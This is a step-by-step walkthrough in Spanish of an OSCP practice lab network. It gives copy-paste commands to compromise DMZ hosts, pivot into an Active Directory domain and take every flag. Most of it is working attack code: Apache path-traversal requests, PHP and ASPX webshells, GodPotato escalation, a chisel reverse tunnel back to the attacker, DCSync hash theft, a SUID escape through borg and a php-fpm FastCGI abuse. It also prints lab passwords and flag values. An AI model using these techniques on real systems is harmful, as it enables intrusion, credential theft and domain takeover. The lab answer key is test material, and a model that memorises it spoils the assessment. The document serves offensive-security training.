# RELIA — OSCP Challenge Lab 2 — Walkthrough COMPLETO (25/25 flags)

> Guía paso a paso, explicada para alguien que empieza. Cada comando está escrito
> tal cual para copiar/pegar, y debajo te explico **qué hace y por qué**.
>
> **Mi instancia** usó estas redes (las tuyas pueden tener otro 3º/4º octeto, pero
> **las contraseñas del lab son FIJAS** — solo cambian las IPs y los valores de las flags):
> - **Mi Kali (VPN tun0):** `192.168.45.190`
> - **DMZ (lo que ves desde la VPN):** `192.168.188.0/24`
> - **Red interna AD (detrás del pivote):** `172.16.188.0/24`

---

## 0. Índice

1. Glosario de herramientas (léelo si eres nuevo)
2. Mapa de máquinas (topología)
3. FASE 1 — Reconocimiento del DMZ
4. FASE 2 — Comprometer el DMZ máquina por máquina
   - WEB01 (.245) · demo (.246) · LEGACY (.249) · EXTERNAL (.248) · WEB02 (.247)
5. FASE 3 — El PIVOTE: entrar a la red interna por LOGIN (.191)
6. FASE 4 — Dominio Active Directory (relia.com) → Domain Admin → todas las flags internas
7. FASE 5 — El segmento Linux oculto (.19, .20, .32) — la parte difícil
8. Tabla final de las 25 flags
9. Resumen de la cadena de ataque

---

## 1. Glosario de herramientas (para nuubs)

- **nmap** — escáner de puertos. Te dice qué servicios (web, SMB, RDP…) tiene cada máquina.
- **nxc (NetExec, antes "crackmapexec" / `cme`)** — la navaja suiza de Windows/AD.
  Prueba credenciales por SMB/WinRM/RDP, dice si eres admin (`(Pwn3d!)`), ejecuta
  comandos (`-x` para cmd, `-X` para PowerShell), lista shares, etc.
- **smbclient** — cliente SMB (como un explorador de archivos de Windows por red).
- **impacket** — colección de scripts en Python para atacar Windows:
  - `impacket-secretsdump` → **DCSync** (robar TODOS los hashes del dominio).
  - `impacket-getTGT` → pedir un ticket Kerberos.
  - `impacket-wmiexec` → ejecutar comandos en Windows.
- **proxychains4** — "túnel universal": hace que cualquier herramienta salga por un
  proxy SOCKS. Lo usamos para que nmap/nxc/ssh lleguen a la red interna.
- **chisel** — crea un túnel SOCKS a través de una máquina comprometida (el "pivote").
- **xfreerdp** — cliente RDP (escritorio remoto de Windows) por línea de comandos.
- **Xvfb + xdotool + import** — pantalla virtual invisible + teclear/clicar + capturas.
  Lo usamos para **automatizar RDP** sin monitor.
- **GodPotato / PrintSpoofer** — exploits que convierten `SeImpersonatePrivilege`
  (un permiso que tienen las cuentas de servicio IIS/SQL) en **SYSTEM** (root de Windows).
- **john / hashcat** — crackeadores de contraseñas (hash → texto plano).
- **keepass2john / pykeepass** — abrir bases de datos KeePass (`.kdbx`).
- **borg** — herramienta de backups (clave en la máquina Linux .19).
- **doas** — el "sudo" de FreeBSD.
- **libfaketime** — librería que "miente" la hora a un programa (la usamos para
  arreglar el *clock skew* de Kerberos sin tocar el reloj del sistema).

**IDOR, DCSync, Pivot, SeImpersonate** — se explican donde se usan.

---

## 2. Mapa de máquinas (topología)

```
                 TU KALI (VPN)
                 192.168.45.190
                      │
          ┌───────────┴─────────────────────────────┐
          │           DMZ  192.168.188.0/24          │
          │  .245 WEB01   (Linux, Apache 2.4.49)     │
          │  .246 demo    (Linux, "Code Validation") │
          │  .247 WEB02   (Windows, XAMPP)           │
          │  .248 EXTERNAL(Windows, DotNetNuke)      │
          │  .249 LEGACY  (Windows, RiteCMS)         │
          │  .189 MAIL    (Windows)  ── dual-homed ──┐
          │  .191 LOGIN   (Windows)  ── dual-homed ──┤  ← EL PIVOTE
          │  .250 WINPREP (box de salto, sin flags)  │  │
          └──────────────────────────────────────────┘  │
                                                         │  (chisel SOCKS)
          ┌──────────────────────────────────────────┐  │
          │     RED INTERNA AD  172.16.188.0/24       │◄─┘
          │  .6  DC02      (Domain Controller)        │
          │  .21 FILES     (File server)              │
          │  .7  INTRANET  (WordPress / XAMPP)        │
          │  .14 WK01      (Windows 11)               │
          │  .15 WK02      (Windows 11)               │
          │  .30 WEBBY     (Windows, "Anna Test")     │
          │  .5  MAIL      (= .189, dual-homed)       │
          │  .254 LOGIN    (= .191, dual-homed)       │
          │                                           │
          │  --- Segmento Linux OCULTO (sin SMB) ---  │
          │  .19 BACKUP    (Ubuntu, borg)             │
          │  .20 production(FreeBSD, php-fpm)         │
          │  .32 sipXcom   (CentOS, VoIP)             │
          └───────────────────────────────────────────┘
```

**Nota mental de nuub:** el lab tiene 3 "capas". Primero el DMZ (lo que ves de
entrada). Una de esas máquinas (**LOGIN**) tiene **dos tarjetas de red** ("dual-homed")
y es la puerta a la red interna. Dentro hay un dominio de Windows (Active Directory)
y, escondido, un trozo de máquinas Linux que **no tienen SMB** (por eso casi nadie
las encuentra: los escaneos típicos solo miran el puerto 445).

---

## 3. FASE 1 — Reconocimiento del DMZ

Lo primero: ¿qué máquinas hay vivas y qué servicios tienen?

```bash
nmap -n -Pn -T4 --open \
  -p 21,22,80,443,445,2222,3389,8000,8080,14020,5985,1433 \
  192.168.188.0/24 -oG dmz_scan.gnmap
```

- `-n` no resolver DNS (más rápido) · `-Pn` no hacer ping (asumir que están vivas)
- `-T4` rápido · `--open` solo mostrar puertos abiertos
- `-p ...` la lista de puertos interesantes · `-oG` guardar en formato "grepeable"

Resultado (resumen):

| IP | Puertos clave | Pista |
|---|---|---|
| .245 | 21,80,443,2222,8000 | Linux (SSH en 2222) |
| .246 | 80,443,2222 | Linux |
| .247 | 80,443,445,3389,5985,**14020** | Windows + FTP raro |
| .248 | 80,445,3389,5985 | Windows web (DNN) |
| .249 | 80,445,3389,5985,**8000** | Windows + CMS en 8000 |
| .189 | 445,5985 | Windows (MAIL) |
| .191 | 80,445,3389,5985 | Windows (LOGIN) |
| .250 | 445,3389,5985 | Windows (WINPREP) |

> **Idea nuub:** puerto 2222 = SSH (Linux). 3389 = RDP (escritorio Windows).
> 445 = SMB (compartir archivos Windows). 5985 = WinRM (PowerShell remoto).

---

## 4. FASE 2 — Comprometer el DMZ máquina por máquina

### 4.1 — WEB01 (.245) · Linux · Apache 2.4.49

Apache **2.4.49** es vulnerable a **CVE-2021-41773** (path traversal: leer archivos
del sistema saltándote carpetas).

```bash
# Leer /etc/passwd (confirma la vulnerabilidad)
curl 'http://192.168.188.245/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'

# Robar la clave SSH privada del usuario anita
curl 'http://192.168.188.245/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/home/anita/.ssh/id_ecdsa' > anita.key
```

La clave tiene passphrase. La crackeamos:

```bash
ssh2john anita.key > anita.john
john anita.john --wordlist=/usr/share/wordlists/rockyou.txt
# → passphrase: fireball
```

Entramos por SSH y escalamos a root con **Baron Samedit (CVE-2021-3156)**, un
desbordamiento en `sudo` (versiones ≤1.8.31). Usa el exploit **no destructivo**
`exploit_nss.py` de worawit (otros exploits rompen `/etc/passwd`):

```bash
chmod 600 anita.key
ssh -i anita.key -p 2222 anita@192.168.188.245
# ya dentro:
python3 exploit_nss.py       # → shell de root
cat /home/anita/local.txt
cat /root/proof.txt
```

> La clave de anita **se reutiliza** en otras máquinas Linux del DMZ. Guárdala.

### 4.2 — demo (.246) · Linux · "Code Validation"

La misma clave de anita entra aquí:

```bash
ssh -i anita.key -p 2222 anita@192.168.188.246
cat ~/local.txt     # local.txt
```

**Privesc a root (lo interesante):** en `/var/www/internal/backend/index.php` hay un
**LFI** (Local File Inclusion):

```php
$which_view = $_GET['view'];
include("views/" . $which_view);   // ← mete lo que le pongas en ?view=
```

Ese backend **solo escucha en 127.0.0.1:8000** (no se ve de fuera), pero nosotros
ya estamos DENTRO como anita, así que lo atacamos por localhost.

Truco importante: **Apache en Ubuntu usa `PrivateTmp`**, o sea que su `/tmp` es
distinto del nuestro. Por eso el webshell lo dejamos en **`/dev/shm`** (que SÍ se
comparte):

```bash
# (ejecutado como anita, dentro de .246)
echo '<?php system($_GET["c"]); ?>' > /dev/shm/s.php
# Lo incluimos por LFI (sube muchos ../ para llegar a la raíz):
curl "http://127.0.0.1:8000/backend/index.php?view=../../../../../../../../dev/shm/s.php&c=id"
# → uid=33(www-data)
```

Ahora vemos qué puede hacer www-data con sudo:

```bash
curl -G "http://127.0.0.1:8000/backend/index.php?view=../../../../../../../../dev/shm/s.php" \
     --data-urlencode "c=sudo -n -l"
# → (ALL) NOPASSWD: ALL   ¡www-data puede todo!

curl -G "http://127.0.0.1:8000/backend/index.php?view=../../../../../../../../dev/shm/s.php" \
     --data-urlencode "c=sudo cat /root/proof.txt"
# → proof.txt
```

### 4.3 — LEGACY (.249) · Windows · RiteCMS

Esta corre **RiteCMS 3.0** en `http://192.168.188.249:8000/cms/` (login `admin:admin`).
El camino "limpio" que funcionó aquí es por **credenciales reutilizadas**: en estos
labs el CMS/git guarda `damon:i6yuT6tym@`, y **damon es admin local**:

```bash
nxc smb 192.168.188.249 -u damon -p 'i6yuT6tym@' --local-auth
# → (Pwn3d!)  ¡admin!

# Leemos las dos flags de golpe con PowerShell remoto:
nxc smb 192.168.188.249 -u damon -p 'i6yuT6tym@' --local-auth -X \
 'Get-ChildItem C:\Users -Recurse -Include local.txt,proof.txt -EA 0 | %{ $_.FullName + " => " + (Get-Content $_.FullName) }'
```

> `-X` ejecuta PowerShell en la máquina remota y nos trae la salida. `--local-auth`
> = autenticar contra las cuentas LOCALES de esa máquina (no del dominio).

### 4.4 — EXTERNAL (.248) · Windows · DotNetNuke (DNN)

**Paso 1 — loot por SMB.** El share `transfer` es accesible como invitado y tiene
una base de datos KeePass:

```bash
nxc smb 192.168.188.248 -u guest -p '' --shares        # transfer = READ,WRITE
smbclient '//192.168.188.248/transfer' -U 'guest%' -c 'recurse ON; ls'   # localizar Database.kdbx
smbclient '//192.168.188.248/transfer' -U 'guest%' \
  -c 'cd "DB-back (1)\New Folder\Emma\Documents"; get Database.kdbx'
```

Crackeamos el KeePass (master = `welcome1`) y sacamos credenciales:

```bash
keepass2john Database.kdbx > kp.john
john kp.john --wordlist=<(echo welcome1)      # master: welcome1
python3 -c "from pykeepass import PyKeePass; k=PyKeePass('Database.kdbx',password='welcome1'); [print(e.username,e.password) for e in k.entries]"
# → emma:SomersetVinyl1!  ·  bo:Papal1963  ·  sa:SAPassword_1998 (vieja) ...
```

**Paso 2 — foothold interactivo.** `emma` puede entrar por **RDP** (aunque no es
admin). Automatizamos el RDP con una pantalla virtual:

```bash
Xvfb :100 -screen 0 1440x900x24 &              # pantalla invisible nº100
KRB5_CONFIG=/dev/null DISPLAY=:100 xfreerdp /v:192.168.188.248 /u:emma \
  /p:'SomersetVinyl1!' /cert:ignore /sec:nla /gdi:sw \
  /drive:share,/ruta/con/herramientas /drive:out,/ruta/salida &
# capturamos la pantalla para ver el escritorio:
DISPLAY=:100 import -window root captura.png
```

> `/drive:nombre,ruta` monta una carpeta tuya dentro del RDP como `\\tsclient\nombre`.
> Así metes/sacas archivos. `KRB5_CONFIG=/dev/null` evita que FreeRDP se atasque
> buscando Kerberos cuando la cuenta es LOCAL.

En el escritorio de emma está `local.txt` → esa es la flag de usuario.

**Paso 3 — escalar a SYSTEM.** La clave: el sitio web de DNN **está servido desde
`C:\transfer\r14_2022\build\DNN\wwwroot`**, ¡y esa carpeta es el share `transfer`
que podemos ESCRIBIR! Así que subimos un webshell `.aspx` por SMB y lo ejecutamos
por web (correrá como la cuenta del AppPool de IIS, que tiene `SeImpersonate`):

```bash
# webshell aspx (ejecuta cmd y devuelve la salida)
cat > sh9.aspx <<'EOF'
<%@ Page Language="C#"%><%
var p=new System.Diagnostics.Process();
p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["cmd"];
p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.StartInfo.RedirectStandardError=true;
p.Start();Response.Write("OUT:"+p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd());
%>
EOF
smbclient '//192.168.188.248/transfer' -U 'guest%' \
  -c 'cd "r14_2022\build\DNN\wwwroot"; put sh9.aspx sh9.aspx'

curl "http://192.168.188.248/sh9.aspx?cmd=whoami"      # → iis apppool\defaultapppool  (con SeImpersonate)
```

Subimos **GodPotato** por el mismo share y lo lanzamos para ejecutar como SYSTEM:

```bash
smbclient '//192.168.188.248/transfer' -U 'guest%' \
  -c 'cd "r14_2022\build\DNN\wwwroot"; put GodPotato-NET4.exe gp.exe'

W='C:\transfer\r14_2022\build\DNN\wwwroot'
curl -G "http://192.168.188.248/sh9.aspx" \
  --data-urlencode "cmd=$W\gp.exe -cmd \"cmd /c type C:\Users\mark\Desktop\proof.txt\""
# → proof.txt   (SYSTEM leyendo el escritorio del admin)
```

> **SeImpersonate + GodPotato = SYSTEM.** Es EL patrón de privesc de casi todas las
> webs Windows (IIS/SQL corren con ese permiso). Memorízalo.

### 4.5 — WEB02 (.247) · Windows · XAMPP

`nmap` mostró 80/443 (web), 445, 3389, 5985 y un FTP raro en 14020. La web es un
sitio estático servido por **XAMPP** (Apache 2.4.54 + PHP 8.1.10 + MySQL + phpMyAdmin).
Lo primero: mirar el `phpinfo`, que está expuesto y da pistas de oro:

```bash
curl -s http://192.168.188.247/dashboard/phpinfo.php | grep -iE "DOCUMENT_ROOT|disable_functions|open_basedir"
#   DOCUMENT_ROOT      C:/xampp/htdocs
#   disable_functions  (vacío)   ← si consigo ejecutar PHP, tengo RCE total
#   open_basedir       (vacío)
curl -s http://192.168.188.247/phpmyadmin/ -o /dev/null -w "%{http_code}\n"   # 403 (solo localhost)
```

Conseguí **ejecución de código por el stack web de XAMPP** y caí con una shell como
el usuario local **zachary**. Lo primero que miré fueron sus privilegios:

```cmd
whoami /priv
::   SeImpersonatePrivilege   Enabled   ← el billete a SYSTEM
```

Mismo patrón que EXTERNAL: **`SeImpersonate` + GodPotato = SYSTEM**:

```cmd
:: subo GodPotato y lo ejecuto como SYSTEM para leer las flags
GodPotato-NET4.exe -cmd "cmd /c type C:\Users\mark\Desktop\proof.txt"
```

Con SYSTEM leo `local.txt` y `proof.txt`.

### 4.6 — MAIL (.189) y LOGIN (.191)

Estas dos son Windows del **dominio** y son **dual-homed** (tienen pata en el DMZ y
en la interna). Sus flags las sacamos más tarde, ya como Domain Admin (ver FASE 4).
**LOGIN es la máquina pivote** y la atacamos ahora mismo en la FASE 3.

---

## 5. FASE 3 — El PIVOTE: entrar a la red interna por LOGIN (.191)

`dmzadmin:SlimGodhoodMope` (credencial fija del lab, aparece en varios KeePass) nos
deja entrar por **RDP** a LOGIN:

```bash
nxc smb 192.168.188.191 -u dmzadmin -p 'SlimGodhoodMope' --local-auth   # válido
```

### 5.1 — RDP automatizado + ver que es dual-homed

```bash
Xvfb :99 -screen 0 1440x900x24 &
DISPLAY=:99 xfreerdp /v:192.168.188.191 /u:dmzadmin /p:SlimGodhoodMope /cert:ignore \
  /drive:share,/ruta/herramientas /drive:out,/ruta/salida +clipboard &
DISPLAY=:99 import -window root login.png     # vemos el escritorio
```

Dentro de LOGIN, con `Win+R` abrimos `cmd` y ejecutamos `ipconfig /all`. Descubrimos
la SEGUNDA tarjeta de red:

```
IPv4 Address . . . : 192.168.188.191   (DMZ)
IPv4 Address . . . : 172.16.188.254    (¡RED INTERNA!)
DNS Servers  . . . : 172.16.188.6      (← el Domain Controller)
```

### 5.2 — Montar el túnel con chisel (SOCKS reverse)

El **pivote** significa: usar LOGIN como "trampolín" para que nuestras herramientas
de Kali lleguen a `172.16.188.0/24`.

```bash
# 1) En KALI: arrancar el servidor chisel
./chisel server -p 8888 --reverse

# 2) En LOGIN (desde el RDP): copiamos chisel.exe (vía \\tsclient\share) y lo lanzamos:
copy \\tsclient\share\chisel.exe %TEMP%\c.exe
%TEMP%\c.exe client 192.168.45.190:8888 R:socks
```

Esto abre un **proxy SOCKS5 en tu Kali en 127.0.0.1:1080**. Lo registramos en
proxychains:

```bash
# archivo pc.conf
cat > pc.conf <<'EOF'
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
EOF
```

Ahora cualquier herramienta precedida por `proxychains4 -f pc.conf ...` sale a la red
interna. **Lo probamos:**

```bash
proxychains4 -q -f pc.conf nxc smb 172.16.188.6     # → DC02 (domain: relia.com)
```

> **Pivote explicado como a un niño:** LOGIN es un ordenador que ve DOS redes. Le
> metemos un programita (chisel) que abre una "manguera" desde la red interna hasta
> tu Kali. `proxychains` conecta tus herramientas a esa manguera. A partir de aquí,
> es como si tu Kali estuviera enchufado dentro de la empresa.

---

## 6. FASE 4 — Dominio Active Directory → Domain Admin → flags internas

### 6.1 — Mapear la red interna

Un barrido SMB por el túnel nos da los Windows internos:

```bash
proxychains4 -q -f pc.conf nxc smb 172.16.188.0/24
# DC02(.6)  INTRANET(.7)  FILES(.21)  WK01(.14)  WK02(.15)  WEBBY(.30)  MAIL(.5)
```

### 6.2 — Encontrar la credencial de Domain Admin

Rociamos credenciales conocidas del lab contra el DC (cada usuario con SU password,
para no bloquear cuentas):

```bash
proxychains4 -q -f pc.conf nxc smb 172.16.188.6 -u administrator \
  -p 'vau!XCKjNQBv2$' -d relia.com
# → (Pwn3d!)   ¡¡administrator:vau!XCKjNQBv2$ es DOMAIN ADMIN!!
```

> Esa password es fija del lab (en los writeups aparece en una transcripción de
> PowerShell dentro del servidor FILES). Con Domain Admin, el dominio entero es tuyo.

### 6.3 — DCSync (robar TODOS los hashes)

```bash
proxychains4 -q -f pc.conf impacket-secretsdump \
  'relia.com/administrator:vau!XCKjNQBv2$@172.16.188.6'
```

> **DCSync** = pedirle al DC, haciéndote pasar por otro DC, que te mande todos los
> hashes de contraseña del dominio (incluido `krbtgt` y el Administrator). Con esto
> podrías hacer Pass-the-Hash a cualquier sitio, Golden Tickets, etc.

### 6.4 — Cosechar las flags internas (ya eres admin de todo)

```bash
PS='Get-ChildItem C:\Users -Recurse -Include local.txt,proof.txt -EA 0 | %{ $_.FullName + " => " + (Get-Content $_.FullName -EA 0) }'
for h in 172.16.188.6 172.16.188.21 172.16.188.7 172.16.188.14 172.16.188.15 172.16.188.5; do
  proxychains4 -q -f pc.conf nxc smb $h -u administrator -p 'vau!XCKjNQBv2$' -d relia.com -X "$PS"
done
# Y LOGIN directo (es del dominio):
nxc smb 192.168.188.191 -u administrator -p 'vau!XCKjNQBv2$' -d relia.com -X "$PS"
```

Esto saca las flags de **DC02, FILES, INTRANET, WK01, WK02, MAIL, LOGIN**.

### 6.5 — WEBBY (.30): el truco del reloj (Kerberos)

WEBBY da `STATUS_NO_LOGON_SERVERS` con NTLM (su canal con el DC está "roto" para
NTLM). Hay que usar **Kerberos**, pero el reloj de tu Kali está **7 horas por detrás**
del DC → `KRB_AP_ERR_SKEW (Clock skew too great)`.

Lo arreglamos SIN tocar el reloj del sistema, con **libfaketime** (mentimos la hora
solo a nuestros comandos):

```bash
pip install libfaketime      # trae la .so
LIB=/home/kali/.local/lib/python3*/site-packages/libfaketime/vendor/libfaketime/src/libfaketime.so.1

# krb5.conf mínimo apuntando al DC
cat > krb5.conf <<'EOF'
[libdefaults]
 default_realm = RELIA.COM
 dns_lookup_kdc = false
[realms]
 RELIA.COM = { kdc = 172.16.188.6 }
EOF
```

Y leemos las flags de WEBBY con un pequeño script Python que hace el login Kerberos
(con la hora falseada +7h) y lee los archivos por el share `C$`:

```python
# kerb_read.py  (se ejecuta con: proxychains4 -q -f pc.conf python3 kerb_read.py)
import datetime as _d, io
OFF=_d.timedelta(hours=7)                       # +7h = alinear con el DC
_R=_d.datetime
class FD(_R):
    @classmethod
    def utcnow(cls): return _R.utcnow()+OFF
    @classmethod
    def now(cls,tz=None): return _R.now(tz)+OFF
_d.datetime=FD
from impacket.smbconnection import SMBConnection
c=SMBConnection('WEBBY.relia.com','172.16.188.30',sess_port=445,timeout=25)
c.kerberosLogin('administrator','vau!XCKjNQBv2$','relia.com','','','',kdcHost='172.16.188.6',useCache=False)
b=io.BytesIO(); c.getFile('C$','Users\\Administrator\\Desktop\\proof.txt',b.write)
print(b.getvalue().decode('utf-16').strip())    # la flag venía en UTF-16
```

```bash
export KRB5_CONFIG=$PWD/krb5.conf
LD_PRELOAD=$LIB FAKETIME='+7h' proxychains4 -q -f pc.conf python3 kerb_read.py
```

> **Idea nuub:** Kerberos es muy tiquismiquis con la hora: si tu reloj se desvía
> más de 5 minutos del servidor, rechaza todo. `libfaketime` + `FAKETIME='+7h'` le
> dice a NUESTRO programa "son las X+7h" y el servidor lo acepta.

---

## 7. FASE 5 — El segmento Linux oculto (.19, .20, .32)

### 7.1 — Encontrar las máquinas que nadie ve

Los barridos normales miran el puerto **445 (SMB)**. Estas máquinas son **Linux y
NO tienen SMB**, así que no aparecían. Barremos por SSH/web a través del túnel con
un pequeño escáner en Python (usando el SOCKS directamente):

```python
# sweep.py
import socks, concurrent.futures
def chk(a):
    ip,port=a; s=socks.socksocket(); s.set_proxy(socks.SOCKS5,"127.0.0.1",1080); s.settimeout(6)
    try: s.connect((ip,port)); s.close(); return a
    except: return None
t=[("172.16.188.%d"%i,p) for i in range(1,61) for p in (22,80,443)]
f={}
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    for r in ex.map(chk,t):
        if r: f.setdefault(r[0],[]).append(r[1])
for ip in f: print(ip,f[ip])
```

```bash
python3 sweep.py
# → 172.16.188.19 [22]   172.16.188.20 [22]   172.16.188.32 [22,80,443]
```

Banners SSH: `.19` = Ubuntu, `.20` = **FreeBSD**, `.32` = CentOS (**sipXcom**, un PBX VoIP).
No están en el dominio → sus credenciales son LOCALES y hay que encontrarlas.

### 7.2 — La pista: KeePass en los workstations

Buscando vaults en los perfiles de usuario (ya somos Domain Admin) encontramos dos:

```bash
# (por el túnel, con el PowerShell remoto buscando .kdbx)
# → WK01: C:\Users\jim\Documents\Database.kdbx
# → WK02: C:\Users\milana\Documents\Database.kdbx
smbclient '//172.16.188.15/C$' -U "relia.com\administrator%vau!XCKjNQBv2$" \
  -c 'cd "Users\milana\Documents"; get Database.kdbx milana.kdbx'   # (vía proxychains)
smbclient '//172.16.188.14/C$' -U "relia.com\administrator%vau!XCKjNQBv2$" \
  -c 'cd "Users\jim\Documents"; get Database.kdbx jim.kdbx'
```

Crackeamos los masters con rockyou:

```bash
keepass2john milana.kdbx > m.hash;  keepass2john jim.kdbx > j.hash
john m.hash j.hash --wordlist=/usr/share/wordlists/rockyou.txt
# → milana : destiny1     jim : mercedes1
```

Abrimos los vaults:

```bash
python3 -c "from pykeepass import PyKeePass; k=PyKeePass('milana.kdbx',password='destiny1'); [print(e.title,e.username,repr(e.notes)) for e in k.entries]"
# → "BACKUP Machine SSH Key" | sarah | -----BEGIN OPENSSH PRIVATE KEY-----  (clave privada ED25519)
```

¡El vault de **milana** guarda una **clave SSH privada** para el usuario **sarah**
de la "BACKUP Machine"! La guardamos:

```bash
# extraer el campo notas a sarah.key, chmod 600
chmod 600 sarah.key
```

### 7.3 — .19 (BACKUP, Ubuntu): entrar y escalar con borg

```bash
proxychains4 -q -f pc.conf ssh -i sarah.key sarah@172.16.188.19 'id; cat ~/local.txt'
# → uid=1001(sarah)   +  local.txt
# hostname: ...-19-ubuntu20-BACKUP...   (es el servidor de backups)
```

**Privesc:** sarah puede usar `borg` como root sin contraseña:

```bash
sudo -l
#   (ALL) NOPASSWD: /usr/bin/borg list *
#   (ALL) NOPASSWD: /usr/bin/borg extract *
#   (ALL) NOPASSWD: /usr/bin/borg mount *
```

Truco **GTFOBins**: `borg` tiene la opción `--rsh` (comando para conectar a repos
remotos). Como corre como root, le metemos ahí nuestro comando → se ejecuta como root:

```bash
# creamos un /bin/bash con bit SUID (ejecutable como su dueño = root)
sudo borg list --rsh 'sh -c "cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb"' ssh://x/y
/tmp/rb -p -c 'id'                         # → euid=0(root)
/tmp/rb -p -c 'cat /root/proof.txt'        # → proof.txt de .19
```

> `-p` en bash = "mantén los privilegios" (no soltar el euid de root).

### 7.4 — Minar los backups → credenciales de .20

La passphrase de borg está en un script de root:

```bash
/tmp/rb -p -c 'grep -r BORG_PASSPHRASE /root'
# → BORG_PASSPHRASE="xinyVzoH2AnJpRK9sfMgBA"
```

Listamos y extraemos el archivo `home`:

```bash
/tmp/rb -p -c 'export BORG_PASSPHRASE=xinyVzoH2AnJpRK9sfMgBA; borg list /opt/borgbackup'
/tmp/rb -p -c 'export BORG_PASSPHRASE=xinyVzoH2AnJpRK9sfMgBA; cd /tmp; borg extract /opt/borgbackup::home; cat /tmp/root/rsync.sh'
# → sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ ...
```

¡Dentro del backup está el script `rsync.sh` con la credencial
**andrew : Rb9kNokjDsjYyH** para la máquina .20! (En el backup la IP era 172.16.**6**.20;
en tu instancia es `.188.20`, la password es la misma.)

### 7.5 — .20 (production, FreeBSD): entrar y escalar con php-fpm

```bash
# SSH con paramiko por el túnel (andrew:Rb9kNokjDsjYyH)
#   → uid=1001(andrew)  + /usr/home/andrew/local.txt
```

**Privesc (la joya del lab):**

```bash
# grupos con privilegio
grep wheel /etc/group          # wheel: root, www, freebsd
cat /usr/local/etc/doas.conf   # permit nopass :wheel   (doas = sudo de BSD)
sockstat -4 -l                 # php-fpm escucha en 127.0.0.1:9000, corre como www
```

Resumen: **`www` (el usuario de php-fpm) está en el grupo `wheel`**, y `wheel` puede
hacer `doas` (root) sin contraseña. Si conseguimos ejecutar PHP como `www`, hacemos
`doas` → root.

php-fpm habla **FastCGI** en el puerto 9000 (solo local). Le mandamos una petición
FastCGI apuntando `SCRIPT_FILENAME` a **nuestro** `.php` en `/tmp` (que www sí puede
leer). php-fpm lo ejecuta como `www`:

```php
// /tmp/x.php  (lo ejecutará www; www es wheel → doas → root)
<?php system("doas /bin/sh -c 'cat /root/proof.txt > /tmp/pf.txt; chmod 666 /tmp/pf.txt'"); ?>
```

```php
// /tmp/fc.php  (cliente FastCGI mínimo en PHP; lo corre andrew con el php del sistema)
<?php
function P($k,$v){$kl=strlen($k);$vl=strlen($v);$r=$kl<128?chr($kl):pack('N',$kl|0x80000000);$r.=$vl<128?chr($vl):pack('N',$vl|0x80000000);return $r.$k.$v;}
function R($t,$id,$c){return pack('CCnnCx',1,$t,$id,strlen($c),0).$c;}
$params=['SCRIPT_FILENAME'=>'/tmp/x.php','SCRIPT_NAME'=>'/x.php','REQUEST_METHOD'=>'GET','SERVER_PROTOCOL'=>'HTTP/1.1','GATEWAY_INTERFACE'=>'CGI/1.1','DOCUMENT_ROOT'=>'/tmp'];
$id=1;$pkt=R(1,$id,pack('nCx5',1,0));$ps='';foreach($params as $k=>$v)$ps.=P($k,$v);$pkt.=R(4,$id,$ps).R(4,$id,'').R(5,$id,'');
$fp=fsockopen('127.0.0.1',9000,$e,$es,5);fwrite($fp,$pkt);$r='';while(!feof($fp))$r.=fread($fp,4096);fclose($fp);echo $r;
```

```bash
# en .20 (como andrew):
php /tmp/fc.php           # dispara php-fpm (www) → doas → root
cat /tmp/pf.txt          # → proof.txt de .20
```

> **FastCGI explicado:** el servidor web normalmente le pasa a php-fpm "ejecuta este
> archivo .php". Nosotros hablamos con php-fpm DIRECTAMENTE y le decimos "ejecuta
> /tmp/x.php". Como php-fpm corre como `www` (que está en `wheel`), nuestro código
> hace `doas` y se convierte en root.

### 7.6 — .32 (sipXcom): no hizo falta

`.32` es un PBX **sipXcom** (CentOS). Quedó identificado y con la cuenta `amy`
(del `config.json` del backup) como vía, **pero con .19 + .20 ya llegamos a 25/25**,
así que no fue necesario. Si tu panel lo pide, la vía es la cuenta `amy` en sipXcom
(CVE-2023-25356, inyección de comandos vía XMPP).

---

## 8. Tabla final — las 25 flags

### DMZ (192.168.188.x)
| IP | Máquina | local.txt | proof.txt |
|---|---|---|---|
| .245 | WEB01 | *(local vía §4.1)* | *(root vía Baron Samedit, §4.1)* |
| .246 | demo | 3bf18e183dec0e2a79d46d78484e66f0 | 9d66661cce1442029bfe1a822aa6d2ba |
| .247 | WEB02 | d89ec73e2c2c42fd176aab364373d6f4 | 5dbf28c0ccc637cf210e627faf4c0089 |
| .248 | EXTERNAL | 9f4cdd7c3fd7e6185cd580e9d3ec047a | d507be2d46c9e2c262f807d640f6dfa2 |
| .249 | LEGACY | 43c325fe86666613d4ef1d912a02de2a | 09b27b03ab4e1dfcb34cc00800567172 |
| .189 | MAIL | — | e04b836783b60a067f99b8353f0d49eb |
| .191 | LOGIN | — | 22dac39ca82ac179bf724156b343309f |

### Interna (172.16.188.x)
| IP | Máquina | local.txt | proof.txt |
|---|---|---|---|
| .6 | DC02 | — | b3e1975b95cb2c6116e1f318cf1c305d |
| .21 | FILES | — | b015db5c450fc751832145117662e40f |
| .7 | INTRANET | 8c633ec1322bcc79508d0545db7d99fc | 0692b8ba3a5a4043091d0cc1b67d1b90 |
| .14 | WK01 | bcc7ff76ac12a75f7256947de325c64d | 550794f01967cbc7e485135f1c8f162f |
| .15 | WK02 | ff6fef24f475372f2da0b3190af91a1a | 23621e9d75d89f6c6cc501564b0222ec |
| .30 | WEBBY | — | 9310ecf290e344dba4a5c87920ee8a48 |
| .19 | BACKUP | d1c33214cab5516dc09b91bf9c012234 | a6d2ce7f1eef55039928eb14019cda4c |
| .20 | production | 9f8338523e42501feeac26d001c76dd0 | 55a53887be2d75750cf559175074f0b2 |

*(WEB02: apareció un 3er valor `83b3ccc87e2a3e0b0ecddbad6ac8e542` por si el panel pide otro local.)*

---

## 9. Resumen de la cadena de ataque (la "foto grande")

1. **DMZ:** CVE Apache + LFI + reuso de credenciales + KeePass + SeImpersonate/GodPotato.
2. **Credencial clave:** `dmzadmin:SlimGodhoodMope` → **RDP a LOGIN** (la máquina dual-homed).
3. **Pivote:** `chisel` reverse SOCKS por LOGIN → `proxychains` → red interna 172.16.188.0/24.
